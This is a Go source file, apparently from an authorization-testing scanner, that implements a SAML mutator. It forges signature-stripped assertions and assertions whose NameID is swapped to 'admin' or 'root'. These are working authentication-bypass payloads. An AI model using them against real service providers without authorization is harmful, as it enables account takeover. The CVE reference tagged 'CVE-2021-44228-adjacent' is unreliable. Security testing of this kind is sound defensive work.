package mutate

// saml_tamper.go implements the --saml-tamper mutator.
//
// SAML (Security Assertion Markup Language) SSO responses carry a base64-encoded
// signed XML assertion submitted as a `SAMLResponse` parameter in a form POST.
// Misconfigured relying parties (service providers) frequently skip or weaken
// signature validation, accepting tampered assertions.
//
// This mutator targets the two highest-signal SAML misconfiguration classes:
//
//  1. signature-strip — remove the <ds:Signature> element entirely.
//     A server that still grants access after seeing an unsigned SAML response
//     has disabled (or never enabled) signature verification: any attacker
//     who can intercept or replay a captured SAMLResponse can forge any
//     identity against this service provider.
//
//  2. nameid-swap — replace the <saml:NameID> (and its counterpart in
//     <saml:Subject> / <samlp:NameID>) with a privileged target value
//     (admin / administrator) while preserving the original signature.
//     A server that accepts this has decoupled identity from the signed
//     assertion — the NameID is read after the signature validation boundary,
//     so a valid signature on a manipulated NameID grants attacker-chosen
//     identity to the session.
//
// Both variants keep the caller's own session credentials unchanged
// (Identity == nil) — they attack the SAML binding layer, not who is
// replaying the request.
//
// Detection: the SAMLResponse parameter must be present in an
// application/x-www-form-urlencoded POST body. The mutator is off by
// default (Enabled == false); enable with --saml-tamper. This mirrors the
// --jwt-attack gating pattern: SAML mutations forge or tamper with assertion
// material, which is noisier than identity swap, so operators must opt in.
//
// Like every mutator, Generate is pure and deterministic: the two techniques
// are emitted in a fixed order (signature-strip first, nameid-swap second)
// so identical inputs yield an identical variant slice.
//
// References
//   - OWASP SAML Security Cheat Sheet — "Signature Exclusion Attack"
//   - CVE-2012-5664 (Ruby-SAML), CVE-2017-11427 (OneLogin), CVE-2021-44228-adjacent
//     SAML library signature-bypass patterns
//   - ASVS V3.5.3 — SAML response integrity requirements

import (
	"encoding/base64"
	"net/url"
	"regexp"
	"strings"

	"github.com/bugsyhewitt/possession/internal/model"
)

// Canonical, human-facing finding identifiers emitted by this mutator.
const (
	FindingSAMLSigStrip  = "POSSESSION-SAML-SIG-STRIP"
	FindingSAMLNameIDSwap = "POSSESSION-SAML-NAMEID-SWAP"
)

// Canonical mutator type strings for the two SAML attack variants.
const (
	mutTypeSAMLSigStrip  = "saml-tamper-sig-strip"
	mutTypeSAMLNameIDSwap = "saml-tamper-nameid-swap"
)

// reSigBlock matches a <ds:Signature ...>...</ds:Signature> block (greedy-
// resistant, dotall-equivalent via [\s\S]).
var reSigBlock = regexp.MustCompile(`(?i)<ds:Signature[\s\S]*?</ds:Signature>`)

// reNameID matches a SAML NameID element in any of its common namespace
// prefixes and captures the value between the tags.
var reNameID = regexp.MustCompile(`(?i)(<(?:saml(?:p|2p)?:)?NameID[^>]*>)([^<]+)(</(?:saml(?:p|2p)?:)?NameID>)`)

// privilegedNameIDs is the ordered list of candidate privileged NameID
// values the nameid-swap technique will substitute. They are the most
// common admin-identity patterns in SAML deployments. We try the first
// one that differs from the captured NameID; the rest are skipped so the
// variant count stays predictable.
var privilegedNameIDs = []string{
	"admin",
	"administrator",
	"root",
	"superuser",
}

// SAMLTamper is the --saml-tamper mutator. It forges two SAML auth-bypass
// variants for each captured SAMLResponse form parameter: a signature-stripped
// assertion and a NameID-swapped assertion.
//
// Generate is pure and deterministic: same inputs ⇒ same output slice
// (including order), so --dry-run and the offline corpus cover it.
type SAMLTamper struct {
	// Enabled gates the mutator. False ⇒ Generate returns nil. Set from
	// the --saml-tamper CLI flag. Default-zero (false) keeps the mutator
	// inert even when registered, matching JWTAuth's Enabled pattern.
	Enabled bool
}

// Name implements Mutator.
func (SAMLTamper) Name() string { return "saml-tamper" }

// Generate implements Mutator. It searches the request body for a
// SAMLResponse parameter (application/x-www-form-urlencoded POST), decodes
// it, and emits up to two variants:
//
//	[0] signature-strip  — <ds:Signature> block removed
//	[1] nameid-swap      — <saml:NameID> replaced with a privileged value
//
// Non-form bodies or requests without a SAMLResponse parameter emit no
// variants. A SAMLResponse value that cannot be base64-decoded is silently
// skipped.
func (s SAMLTamper) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
	if !s.Enabled || base == nil {
		return nil
	}

	// Only act on form-encoded POST bodies.
	if !strings.EqualFold(base.Method, "POST") {
		return nil
	}
	ct := strings.ToLower(base.ContentType)
	if !strings.Contains(ct, "application/x-www-form-urlencoded") {
		// Also accept if ContentType is empty but body looks form-encoded.
		if ct != "" || !looksFormEncoded(base.Body) {
			return nil
		}
	}

	// Parse the form body and locate the SAMLResponse parameter.
	vals, err := url.ParseQuery(string(base.Body))
	if err != nil {
		return nil
	}
	samlB64 := vals.Get("SAMLResponse")
	if samlB64 == "" {
		return nil
	}

	// SAML responses may use standard or URL-safe base64, with or without
	// padding. Try both decodings.
	raw, err := base64.StdEncoding.DecodeString(samlB64)
	if err != nil {
		raw, err = base64.RawStdEncoding.DecodeString(samlB64)
		if err != nil {
			return nil
		}
	}
	xml := string(raw)

	var out []model.Variant

	// ── Variant 1: signature-strip ────────────────────────────────────────
	stripped := reSigBlock.ReplaceAllString(xml, "")
	if stripped != xml { // only emit if we actually removed something
		if req := replaceFormParam(base, vals, "SAMLResponse", reEncode(stripped)); req != nil {
			out = append(out, model.Variant{
				Base: req,
				Mutation: model.Mutation{
					Type: mutTypeSAMLSigStrip,
					Description: "remove <ds:Signature> block from SAML assertion " +
						"(signature-exclusion bypass: server may skip validation when signature absent)",
					Detail: map[string]string{
						"attack":     "sig-strip",
						"finding_id": FindingSAMLSigStrip,
						"severity":   "critical",
					},
					Class: "authn-bypass",
				},
			})
		}
	}

	// ── Variant 2: NameID swap ────────────────────────────────────────────
	// Find the original NameID value and replace it with the first
	// privilegedNameID that differs from the original.
	m := reNameID.FindStringSubmatch(xml)
	if len(m) == 4 {
		originalNameID := strings.TrimSpace(m[2])
		for _, target := range privilegedNameIDs {
			if strings.EqualFold(target, originalNameID) {
				continue
			}
			// Substitute the target NameID into all occurrences (there may be
			// two: one in Subject and one in AttributeStatement or Conditions).
			// Back-references ${1} and ${3} reuse the match's capture groups
			// directly, avoiding a redundant FindStringSubmatch inside the loop.
			swapped := reNameID.ReplaceAllString(xml, "${1}"+target+"${3}")
			if req := replaceFormParam(base, vals, "SAMLResponse", reEncode(swapped)); req != nil {
				out = append(out, model.Variant{
					Base: req,
					Mutation: model.Mutation{
						Type: mutTypeSAMLNameIDSwap,
						Description: "replace SAML NameID '" + originalNameID + "' → '" + target +
							"' while preserving the original signature " +
							"(NameID-after-validation bypass: identity read outside the signed boundary)",
						Detail: map[string]string{
							"attack":          "nameid-swap",
							"original_nameid": originalNameID,
							"target_nameid":   target,
							"finding_id":      FindingSAMLNameIDSwap,
							"severity":        "critical",
						},
						Class: "authn-bypass",
					},
				})
			}
			break // one swap variant per request
		}
	}

	return out
}

// replaceFormParam clones base, substitutes param=newValue in the parsed
// form values, re-encodes the body, and returns the new request. Returns
// nil if the encoding fails.
func replaceFormParam(base *model.CapturedRequest, vals url.Values, param, newValue string) *model.CapturedRequest {
	// Shallow-copy the parsed values and overwrite the target param.
	out := make(url.Values, len(vals))
	for k, v := range vals {
		out[k] = v
	}
	out.Set(param, newValue)

	req := CloneRequest(base)
	req.Body = []byte(out.Encode())
	return req
}

// reEncode encodes xml as standard base64 (the SAML HTTP POST binding
// mandates standard base64 with newlines stripped for the SAMLResponse
// parameter — RFC 4648 §4).
func reEncode(xml string) string {
	return base64.StdEncoding.EncodeToString([]byte(xml))
}

// looksFormEncoded returns true when b looks like an
// application/x-www-form-urlencoded body (contains no null bytes and
// has at least one "key=value" pair separated by & or just one pair).
// Used as a fallback when ContentType is empty.
func looksFormEncoded(b []byte) bool {
	if len(b) == 0 {
		return false
	}
	s := string(b)
	// Presence of 'SAMLResponse=' is the real gate — if it's there, we care.
	return strings.Contains(s, "SAMLResponse=")
}
